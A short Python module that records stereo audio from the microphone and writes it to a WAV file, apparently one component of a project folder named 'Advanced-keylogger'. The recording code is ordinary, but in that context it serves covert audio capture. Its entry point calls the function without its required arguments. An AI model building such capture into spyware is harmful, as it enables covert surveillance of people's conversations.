#module for recording audio
from scipy.io.wavfile import write
import sounddevice as sd



#file paths for accessing location
file_path = "S:\\DEV\\Python\\Advanced-keylogger" 
extend = "\\"


# to record audio 
def microphone(path,rt):
    fs = 44100 #frequency for capture
    seconds = rt #recording duration

    # Start recorder with the given values
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(path, fs, recording)

if __name__ == "__main__":
    microphone()